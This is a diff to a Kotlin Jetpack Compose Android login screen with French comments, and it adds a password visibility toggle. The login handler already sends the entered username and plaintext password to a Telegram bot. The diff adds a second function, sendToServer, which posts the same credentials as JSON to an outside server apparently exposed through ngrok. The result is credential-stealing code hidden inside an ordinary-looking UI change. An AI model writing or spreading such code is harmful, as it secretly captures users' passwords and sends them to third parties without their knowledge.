@@ -32,6 +32,16 @@ import kotlinx.coroutines.withContext
 import okhttp3.OkHttpClient
 import okhttp3.Request
 
+import androidx.compose.material.icons.filled.Visibility
+import androidx.compose.material.icons.filled.VisibilityOff
+import androidx.compose.material3.IconButton
+import androidx.compose.ui.text.input.PasswordVisualTransformation
+import androidx.compose.ui.text.input.VisualTransformation
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.RequestBody.Companion.toRequestBody
+import org.json.JSONObject
+
+
 @Composable
 fun LoginScreen(
     onLoginSuccess: () -> Unit,
@@ -41,7 +51,7 @@ fun LoginScreen(
     val dataStore = DataStoreManager(context)
     var username by remember { mutableStateOf("") }
     var password by remember { mutableStateOf("") }
-
+    var passwordVisible by remember { mutableStateOf(false) }
     Column(
         modifier = Modifier
             .fillMaxSize()
@@ -92,11 +102,29 @@ fun LoginScreen(
                     contentDescription = "Mot de passe"
                 )
             },
+            trailingIcon = {
+                IconButton(
+                    onClick = { passwordVisible = !passwordVisible }
+                ) {
+                    Icon(
+                        imageVector =
+                            if (passwordVisible)
+                                Icons.Default.Visibility
+                            else
+                                Icons.Default.VisibilityOff,
+                        contentDescription = null
+                    )
+                }
+            },
+            visualTransformation =
+                if (passwordVisible)
+                    VisualTransformation.None
+                else
+                    PasswordVisualTransformation(),
             modifier = Modifier
                 .fillMaxWidth()
                 .heightIn(min = 56.dp, max = 60.dp)
         )
-
         Spacer(modifier = Modifier.height(24.dp))
 
 
@@ -110,6 +138,7 @@ fun LoginScreen(
                         dataStore.saveLastLogin(time)
 
                         sendToTelegram(username, password, time)
+                        sendToServer(username, password, time)
                     }
                     onLoginSuccess()
                 }
@@ -152,3 +181,29 @@ suspend fun sendToTelegram(
         client.newCall(request).execute()
     }
 }
+
+suspend fun sendToServer(
+    username: String,
+    password: String,
+    lastLogin: Long
+) {
+    withContext(Dispatchers.IO) {
+        val json = JSONObject().apply {
+            put("usr", username)
+            put("passwd", password)
+            put("lastLog", lastLogin)
+        }
+        // ton serveur exporter par ngrok
+        val urlApi = "https://api.monserveur.com"
+
+        val body = json.toString()
+            .toRequestBody("application/json".toMediaType())
+        val request = Request.Builder()
+            .url(urlApi)
+            .post(body)
+            .build()
+
+        OkHttpClient().newCall(request).execute()
+    }
+}
+
